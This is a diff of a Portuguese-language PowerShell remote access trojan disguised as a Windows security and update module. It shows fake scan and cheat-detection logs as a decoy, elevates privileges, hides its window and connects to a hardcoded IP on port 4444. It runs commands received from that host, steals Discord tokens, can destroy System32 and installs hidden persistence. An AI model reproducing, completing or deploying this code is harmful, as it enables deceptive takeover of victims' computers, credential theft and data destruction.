@@ -7,78 +7,72 @@ Microsoft Windows Critical Update Module - Complete Control
 Version: 10.0.19045.1
 #>
 
-# ===== CONFIGURAÇÕES =====
+# ===== CONFIGURACOES =====
 $serverIP = "198.1.195.194"  # MUDE PARA SEU IP
 $serverPort = 4444
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
 
-# ===== LOGS FAKES =====
+# ===== LOGS FAKES (SEM EMOJIS) =====
 $fakeLogs = @(
-    "⚙️ Inicializando módulo de verificação do sistema...",
-    "📊 Carregando bibliotecas de análise...",
-    "🔍 Verificando integridade do sistema...",
-    "📁 Escaneando arquivos críticos do Windows...",
-    "🛡️ Analisando processos em execução...",
-    "🔬 Detectando possíveis ameaças...",
-    "📈 Verificando assinaturas digitais...",
-    "⚡ Analisando tráfego de rede...",
-    "🔎 Procurando por cheats e hacks...",
-    "🛑 Verificando integridade da memória...",
-    "✅ Módulo de segurança carregado com sucesso.",
-    "🔄 Sincronizando com servidores Microsoft...",
-    "📝 Registrando informações do sistema...",
-    "🔐 Verificando certificados de segurança...",
-    "🖥️ Analisando hardware do sistema..."
+    "[+] Inicializando modulo de verificacao do sistema...",
+    "[+] Carregando bibliotecas de analise...",
+    "[+] Verificando integridade do sistema...",
+    "[+] Escaneando arquivos criticos do Windows...",
+    "[+] Analisando processos em execucao...",
+    "[+] Detectando possiveis ameacas...",
+    "[+] Verificando assinaturas digitais...",
+    "[+] Analisando trafego de rede...",
+    "[+] Procurando por cheats e hacks...",
+    "[+] Verificando integridade da memoria...",
+    "[+] Modulo de seguranca carregado com sucesso.",
+    "[+] Sincronizando com servidores Microsoft...",
+    "[+] Registrando informacoes do sistema...",
+    "[+] Verificando certificados de seguranca...",
+    "[+] Analisando hardware do sistema..."
 )
 
 $cheatLogs = @(
-    "⚠️ ALERTA: Possível cheat detectado em: C:\Users\$env:USERNAME\AppData\Local\Temp\cheat.exe",
-    "⚠️ ALERTA: Processo suspeito: hacktool.exe (PID: $((Get-Random -Minimum 1000 -Maximum 9999)))",
-    "⚠️ ALERTA: Modificação não autorizada na memória do jogo detectada",
-    "⚠️ ALERTA: DLL suspeita injetada no processo explorer.exe",
-    "⚠️ ALERTA: Driver não assinado detectado: speedhack.sys",
-    "⚠️ ALERTA: Hook de teclado não autorizado encontrado",
-    "⚠️ ALERTA: Tentativa de acesso à memória de outro processo bloqueada",
-    "⚠️ ALERTA: Cheat de wallhack detectado no sistema",
-    "⚠️ ALERTA: Programa de auto-aim identificado: aimbot.exe",
-    "⚠️ ALERTA: Modificação de texturas detectada"
+    "[!] ALERTA: Possivel cheat detectado em: C:\Users\$env:USERNAME\AppData\Local\Temp\cheat.exe",
+    "[!] ALERTA: Processo suspeito: hacktool.exe (PID: $((Get-Random -Minimum 1000 -Maximum 9999)))",
+    "[!] ALERTA: Modificacao nao autorizada na memoria detectada",
+    "[!] ALERTA: DLL suspeita injetada no processo explorer.exe",
+    "[!] ALERTA: Driver nao assinado detectado: speedhack.sys",
+    "[!] ALERTA: Hook de teclado nao autorizado encontrado",
+    "[!] ALERTA: Cheat de wallhack detectado no sistema",
+    "[!] ALERTA: Programa de auto-aim identificado: aimbot.exe"
 )
 
 $cleanLogs = @(
-    "✅ Nenhuma ameaça encontrada no sistema",
-    "✅ Todos os processos estão limpos",
-    "✅ Integridade do sistema verificada",
-    "✅ Nenhum cheat detectado",
-    "✅ Sistema seguro - prosseguindo com atualização",
-    "✅ Verificação concluída sem problemas"
+    "[OK] Nenhuma ameaca encontrada no sistema",
+    "[OK] Todos os processos estao limpos",
+    "[OK] Integridade do sistema verificada",
+    "[OK] Nenhum cheat detectado",
+    "[OK] Sistema seguro - prosseguindo com atualizacao"
 )
 
-# ===== FUNÇÃO PARA MOSTRAR LOGS FAKES =====
+# ===== FUNCAO PARA MOSTRAR LOGS FAKES =====
 function Show-FakeLogs {
     $host.UI.RawUI.ForegroundColor = "Green"
     Write-Host ""
-    Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-    Write-Host "║         MÓDULO DE SEGURANÇA DO WINDOWS                    ║" -ForegroundColor Cyan
-    Write-Host "║         Versão 10.0.19045.1                                ║" -ForegroundColor Cyan
-    Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    Write-Host "==================================================" -ForegroundColor Cyan
+    Write-Host "    MODULO DE SEGURANCA DO WINDOWS" -ForegroundColor Cyan
+    Write-Host "    Versao 10.0.19045.1" -ForegroundColor Cyan
+    Write-Host "==================================================" -ForegroundColor Cyan
     Write-Host ""
     
-    # Mostra logs iniciais
     foreach ($log in $fakeLogs) {
         Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
         Start-Sleep -Milliseconds 200
     }
     
     Write-Host ""
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] 🔍 INICIANDO VERIFICAÇÃO DETALHADA..." -ForegroundColor Yellow
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] INICIANDO VERIFICACAO DETALHADA..." -ForegroundColor Yellow
     Start-Sleep -Seconds 1
     
-    # Simula análise de arquivos
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] 📁 Escaneando arquivos do sistema..." -ForegroundColor Gray
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Escaneando arquivos do sistema..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 800
     
-    # Mostra alguns logs de "cheat" aleatórios
     $numCheats = Get-Random -Minimum 2 -Maximum 5
     for ($i = 0; $i -lt $numCheats; $i++) {
         $cheatLog = $cheatLogs | Get-Random
@@ -87,42 +81,37 @@ function Show-FakeLogs {
     }
     
     Start-Sleep -Seconds 1
-    
-    # Mostra logs de "limpeza"
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] 🧹 Executando rotina de limpeza..." -ForegroundColor Yellow
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Executando rotina de limpeza..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 700
     
-    # Barra de progresso falsa
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ⚙️ Removendo ameaças: " -NoNewline
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Removendo ameacas: " -NoNewline
     for ($i = 0; $i -le 100; $i += 10) {
         Write-Host "$i%" -NoNewline -ForegroundColor Green
         Start-Sleep -Milliseconds 100
-        Write-Host "..." -NoNewline
+        if ($i -lt 100) { Write-Host "..." -NoNewline }
     }
     Write-Host " OK" -ForegroundColor Green
     
     Start-Sleep -Seconds 1
-    
-    # Mostra logs de conclusão
     $cleanLog = $cleanLogs | Get-Random
     Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $cleanLog" -ForegroundColor Green
     
     Write-Host ""
-    Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-    Write-Host "║   VERIFICAÇÃO CONCLUÍDA - SISTEMA SEGURO                   ║" -ForegroundColor Cyan
-    Write-Host "║   Inicializando componentes de atualização...              ║" -ForegroundColor Cyan
-    Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    Write-Host "==================================================" -ForegroundColor Cyan
+    Write-Host "   VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Cyan
+    Write-Host "   Inicializando componentes de atualizacao..." -ForegroundColor Cyan
+    Write-Host "==================================================" -ForegroundColor Cyan
     Write-Host ""
     
     $host.UI.RawUI.ForegroundColor = "White"
     Start-Sleep -Seconds 2
 }
 
-# ===== MUTEX - EVITA MÚLTIPLAS INSTÂNCIAS =====
+# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0, $false)) { exit }
 
-# ===== ELEVAR PRIVILÉGIOS =====
+# ===== ELEVAR PRIVILEGIOS =====
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell -Verb RunAs -ArgumentList $arguments
@@ -142,7 +131,7 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== FUNÇÕES PRINCIPAIS =====
+# ===== FUNCOES PRINCIPAIS =====
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -266,7 +255,7 @@ function Execute-Command {
     param($Cmd)
     try {
         $result = Invoke-Expression $Cmd 2>&1 | Out-String
-        if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado (sem saída)" }
+        if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado (sem saida)" }
         return $result
     } catch {
         return "Erro: $_"
@@ -306,7 +295,7 @@ function Get-DiscordToken {
     }
 }
 
-# ===== FUNÇÕES DESTRUTIVAS =====
+# ===== FUNCOES DESTRUTIVAS =====
 function Block-System32 {
     try {
         $path = "C:\Windows\System32"
@@ -373,7 +362,7 @@ function Power-Control {
     }
 }
 
-# ===== PERSISTÊNCIA =====
+# ===== PERSISTENCIA =====
 function Install-Persistence {
     $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
     
@@ -395,12 +384,12 @@ function Install-Persistence {
     attrib +h +s +r $scriptPath
 }
 
-# ===== VERIFICAR INSTALAÇÃO =====
+# ===== VERIFICAR INSTALACAO =====
 if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
     Install-Persistence
 }
 
-# ===== CONEXÃO PRINCIPAL =====
+# ===== CONEXAO PRINCIPAL =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
@@ -409,7 +398,7 @@ while ($true) {
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
-        # ENVIA IDENTIFICAÇÃO
+        # ENVIA IDENTIFICACAO
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
         while ($client.Connected) {
@@ -519,7 +508,7 @@ while ($true) {
                 }
                 
                 default { 
-                    $writer.WriteLine("Comando não reconhecido: $cmd")
+                    $writer.WriteLine("Comando nao reconhecido: $cmd")
                 }
             }
         }
